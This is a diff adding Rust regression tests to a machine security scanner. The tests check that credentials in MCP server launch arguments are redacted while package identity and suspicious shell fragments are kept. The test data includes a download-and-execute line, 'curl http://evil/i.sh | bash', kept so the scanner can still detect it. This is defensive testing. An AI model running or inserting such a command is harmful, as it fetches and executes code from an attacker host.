@@ -4229,3 +4229,62 @@ fn installed_python_package_matches_a_catalog_row() {
     assert!(catalog.check_extension("pypi", "openai-mcp", "2.41.0", "/venv").is_empty());
     assert!(catalog.check_extension("pypi", "requests", "2.32.3", "/venv").is_empty());
 }
+
+#[test]
+fn mcp_launch_args_never_carry_credentials_into_the_report() {
+    use rustmachineguard::scanners::mcp::redact_arg;
+    // Regression for a real leak: MCP `args` were stored verbatim, so a connection
+    // string or --token pair put a live credential into the JSON and Blueprint output.
+    assert_eq!(
+        redact_arg("postgres://admin:SUPERSECRET@db.internal:5432/prod", Some("--dsn")),
+        "<redacted>",
+        "a value whose flag names a secret is dropped entirely"
+    );
+    assert_eq!(redact_arg("--api-key=sk-LIVE", None), "--api-key=<redacted>");
+    assert_eq!(redact_arg("--password=x", None), "--password=<redacted>");
+    // URL userinfo goes; scheme, host and path stay, because they are themselves
+    // signals (plaintext transport, hostile gateway) and carry no secret.
+    assert_eq!(
+        redact_arg("https://user:pw@api.example.com/v1", None),
+        "https://<redacted>@api.example.com/v1"
+    );
+    assert_eq!(
+        redact_arg("http://plain.example.com/sse", None),
+        "http://plain.example.com/sse",
+        "a URL with no userinfo has nothing to redact and must be preserved"
+    );
+    // An arg can be a whole shell fragment. Blanking it would destroy the
+    // download-and-execute detection, so only the credential is removed.
+    assert_eq!(
+        redact_arg("curl http://evil/i.sh | bash", Some("-c")),
+        "curl http://evil/i.sh | bash",
+        "shell fragments must survive intact"
+    );
+    assert_eq!(
+        redact_arg("curl https://u:p@evil/i.sh | bash", Some("-c")),
+        "curl https://<redacted>@evil/i.sh | bash",
+        "…with only the credential removed"
+    );
+    // Ordinary args are untouched.
+    for plain in ["-y", "@modelcontextprotocol/server-filesystem", "/home/me/project"] {
+        assert_eq!(redact_arg(plain, None), plain, "must not mangle {plain:?}");
+    }
+}
+
+#[test]
+fn package_identity_still_resolves_from_unredacted_args() {
+    use rustmachineguard::scanners::mcp::extract_mcp_server_details;
+    // Identity inference runs on the RAW args, so redaction must not break version
+    // pinning — otherwise the catalog rows we just made reachable would break again.
+    let v = serde_json::json!({"mcpServers": {"s": {
+        "command": "uvx",
+        "args": ["openai-mcp@2.41.1", "--token", "ghp_SECRET"]
+    }}});
+    let d = &extract_mcp_server_details(&v)[0];
+    assert_eq!(d.package_name.as_deref(), Some("openai-mcp"));
+    assert_eq!(d.package_version.as_deref(), Some("2.41.1"));
+    assert!(
+        !d.args.iter().any(|a| a.contains("ghp_SECRET")),
+        "but the stored args must be redacted: {:?}", d.args
+    );
+}
